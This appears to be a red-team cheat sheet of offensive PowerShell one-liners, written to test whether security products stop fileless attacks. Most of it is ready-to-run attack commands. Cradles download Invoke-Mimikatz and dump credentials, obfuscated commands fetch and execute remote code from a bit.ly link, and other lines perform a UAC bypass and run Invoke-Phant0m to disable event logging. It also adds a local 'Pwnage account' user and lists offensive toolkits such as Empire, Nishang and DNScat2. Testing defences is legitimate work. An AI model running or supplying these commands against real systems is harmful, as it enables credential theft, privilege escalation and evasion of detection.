

# Powershell

Every product today reports they can prevent fileless, living off the land, nation state :all_the_things: . I say - prove it.

http://www.labofapenetrationtester.com/2015/04/pillage-the-village-powershell-version.html

https://www.blackhillsinfosec.com/?p=5831

## One Liners

### Download Mimikatz and Dump credentials

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

### Download Mimikatz and Dump credentials

Just download it:

    (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))

Minor obfuscation:

    (New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()

All obfuscation:

    Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))

Mimikatz - Cradlecraft PsSendKeys

    $url='https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr

### Invoke-AppPathBypass

Note: Windows 10 only

Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/

    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/master/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass"

At prompt, to test:

    C:\Windows\System32\cmd.exe

### Obfuscated Powershell

Fancy obfuscation that reaches out to bit.ly/L3g1t to stdout: "SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION"

    cmd /c "set apple=fish (cars help://bit.ly/L3g1t).content&&cmd /c set boat=%apple:fish=iex% ^&^&cmd /c set ab=%boat:cars=iwr% ^^^&^^^&cmd /c echo %ab:el=tt%|%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% -"

Second test:

    cmd /c "set apple=fish (cars ('http://bit.ly/L3g1tCrad1e).content&&cmd /c set boat=%apple:fish=iex% ^&^&cmd /c set ab=%boat:cars=iwr% ^^^&^^^&cmd /c echo %ab:el=tt%|%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% -"

## Powershell Obfuscation

Provided by @danielbohannon

[Out-FINcodedCommand](https://github.com/danielbohannon/Out-FINcodedCommand/blob/master/README.md)


Setup:

    Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/danielbohannon/Out-FINcodedCommand/master/Out-FINcodedCommand.ps1')

Input:

    Out-FINcodedCommand -command "iex (iwr http://bit.ly/L3g1t).content" -FinalBinary powershell

Follow prompts to create variables.

Output:

    cmd /c "set apple=fish (cars help://bit.ly/L3g1t).content&&cmd /c set boat=%apple:fish=iex% ^&^&cmd /c set ab=%boat:cars=iwr% ^^^&^^^&cmd /c echo %ab:el=tt%|%ProgramData:~3,1%%ProgramData:~5,1%we%ProgramData:~7,1%she%Public:~12,1%%Public:~12,1% -"



[Invoke-CradleCrafter](https://github.com/danielbohannon/Invoke-CradleCrafter)

Input:

    code here

Output:

    code here

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)

Input:

    code here

Output:

    code here

## Powershell Kits

### Unicorn

https://github.com/trustedsec/unicorn/blob/master/README.md

### Empire

http://www.powershellempire.com/

### Bloodhound

https://github.com/BloodHoundAD/BloodHound

### GoFetch

https://github.com/GoFetchAD/GoFetch

### Deathstar

https://github.com/byt3bl33d3r/DeathStar

https://byt3bl33d3r.github.io/automating-the-empire-with-the-death-star-getting-domain-admin-with-a-push-of-a-button.html

### PowerSploit

https://github.com/PowerShellMafia/PowerSploit

### Nishang

https://github.com/samratashok/nishang

### PSAttack

https://github.com/jaredhaight/PSAttack

### Dr0p1t-Framework

https://github.com/D4Vinci/Dr0p1t-Framework

### PowerOPS

https://github.com/fdiskyou/PowerOPS

    powershell.exe Copy ([PSObject].Assembly.Location) C:\

Then:

    csc.exe /unsafe /reference:"C:\System.Management.Automation.dll" /reference:System.IO.Compression.dll /out:C:\users\ieuser\desktop\PowerOPS_x64.exe /platform:x64 "C:\Users\IEUser\Downloads\PowerOPS-1.0-beta\PowerOps\*.cs"

### Invoke-AutoIt

https://github.com/byt3bl33d3r/Invoke-AutoIt

    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/byt3bl33d3r/Invoke-AutoIt/master/Invoke-AutoIt.ps1'); Invoke-AutoIt -WindowTitle "Remote Desktop" -Keys "Rainbow Push-ups""

### Invoke-Phant0m

https://github.com/hlldz/Invoke-Phant0m

    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1'); Invoke-Phant0m"

### Download Minicars and Dump credentials (Mimikatz alternative)

https://twitter.com/curi0usjack/status/883344872438104064

https://gist.github.com/curi0usJack/adbf34bd402f28138388bd6e266da961

    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"    

# Other

### DNScat2-powershell

https://github.com/lukebaggett/dnscat2-powershell

# Powershell 5.1

The following requires Powershell 5.1: https://www.microsoft.com/en-us/download/details.aspx?id=54616

Moar fun here: https://4sysops.com/archives/the-new-local-user-and-group-cmdlets-in-powershell-5-1/

## Add User

    New-LocalUser -FullName 'Jack Frost' -Name 'Jackfro' -Password PwnDiddy1 ‑Description 'Pwnage account'

## Create a group

    New-LocalGroup -Name 'Testgroup' -Description 'Testing group'
